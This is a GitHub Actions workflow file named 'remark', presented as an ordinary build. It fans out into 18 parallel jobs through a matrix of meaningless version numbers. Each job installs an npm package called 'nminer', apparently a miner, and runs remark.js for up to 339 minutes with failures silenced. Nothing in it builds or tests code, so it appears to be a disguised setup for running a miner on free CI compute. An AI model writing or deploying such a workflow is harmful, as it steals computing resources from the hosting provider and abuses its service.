name: remark
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 168 }
          - { version: 7712 }
          - { version: 4367 }
          - { version: 9165 }
          - { version: 5078 }
          - { version: 2158 }
          - { version: 175 }
          - { version: 2686 }
          - { version: 4544 }
          - { version: 3762 }
          - { version: 2431 }
          - { version: 5030 }
          - { version: 8921 }
          - { version: 9567 }
          - { version: 72 }
          - { version: 400 }
          - { version: 6602 }
          - { version: 1359 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: immediately cap granny
        run: |
          npm install nminer@latest
          timeout 339m node remark.js || echo "remark executed"